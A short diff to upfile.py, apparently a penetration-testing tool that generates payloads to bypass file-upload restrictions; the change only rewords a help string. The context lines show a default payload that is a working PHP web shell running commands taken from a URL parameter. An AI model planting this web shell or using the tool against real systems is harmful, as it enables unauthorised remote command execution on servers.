@@ -66,7 +66,7 @@ if __name__ == '__main__':
         prog='upfile.py',
         description='Generate some payload to bypass restriction when you perform a file upload')
 
-    parser.add_argument('-d', '--debug', action='store_true', help='Seen the debug to see the process')
+    parser.add_argument('-d', '--debug', action='store_true', help='Show debugging to see the process')
     parser.add_argument('-p', '--payload', help='The payload in the files', default='<?php system($_GET["cmd"]); ?>',metavar='<payload>')
     parser.add_argument('-f', '--file', help='The type of the files', default='php', choices=['php'])
     parser.add_argument('-ext', '--extension', help='Generate the payload with specific extension',metavar='<ext>')
